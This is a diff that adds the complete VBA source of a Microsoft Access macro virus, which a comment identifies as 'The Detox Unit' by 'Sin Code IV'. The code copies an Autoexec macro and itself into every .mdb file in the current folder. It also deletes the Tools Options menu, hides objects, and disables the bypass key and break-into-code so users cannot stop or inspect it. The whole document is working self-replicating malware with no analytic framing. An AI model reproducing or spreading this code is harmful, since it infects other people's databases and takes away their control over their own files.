@@ -1,0 +1,59 @@
+   Attribute VB_Name = "TDU"
+   Option Compare Database
+   Option Explicit
+   Function TheDetoxUnit()
+   Dim InfectMDB, Com, pName, fName As String
+   Dim Skip As Boolean
+   Skip = False
+   Call SetStartupProperties
+   On Error Resume Next
+   Com = CurrentDb.Name
+   Application.SetOption "Show Hidden Objects", False
+   CommandBars("tools").Controls("Options...").Delete
+   pName = CurDir & "\"
+   fName = Dir(pName & "*.mdb")
+   If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectMDB = pName & fName
+   If Com = InfectMDB Then Skip = True
+   If Skip = False Then DoCmd.TransferDatabase acExport, "Microsoft Access", InfectMDB, acMacro, "Autoexec", "Autoexec"
+   If Skip = False Then DoCmd.TransferDatabase acExport, "Microsoft Access", InfectMDB, acModule, "TDU", "TDU"
+   Do While (fName <> "")
+   fName = Dir()
+   If (fName <> "") And _
+   ((fName <> ".") And (fName <> "..")) Then
+   InfectMDB = pName & fName
+   Skip = False
+   If Com = InfectMDB Then Skip = True
+   If Skip = False Then DoCmd.TransferDatabase acExport, "Microsoft Access", InfectMDB, acMacro, "Autoexec", "Autoexec"
+   If Skip = False Then DoCmd.TransferDatabase acExport, "Microsoft Access", InfectMDB, acModule, "TDU", "TDU"
+   End If
+   Loop
+   End Function
+   Sub SetStartupProperties()
+       ChangeProperty "AllowSpecialKeys", dbBoolean, False
+       ChangeProperty "AllowBreakIntoCode", dbBoolean, False
+       ChangeProperty "AllowBypassKey", dbBoolean, False
+   End Sub
+   Function ChangeProperty(strPropName As String, varPropType As Variant, varPropValue As Variant) As Integer
+       Dim dbs As Database, prp As Property
+       Const conPropNotFoundError = 3270
+       Set dbs = CurrentDb
+       On Error GoTo Change_Err
+       dbs.Properties(strPropName) = varPropValue
+       ChangeProperty = True
+   Change_Bye:
+       Exit Function
+   Change_Err:
+       If Err = conPropNotFoundError Then
+           Set prp = dbs.CreateProperty(strPropName, varPropType, varPropValue)
+           dbs.Properties.Append prp
+           Resume Next
+       Else
+           ChangeProperty = False
+           Resume Change_Bye
+       End If
+   End Function
+   Sub Info()
+   ' The Detox Unit Access Macro Virus
+   ' written by Sin Code IV
+   ' (an old friend by any other name...)
+   End Sub
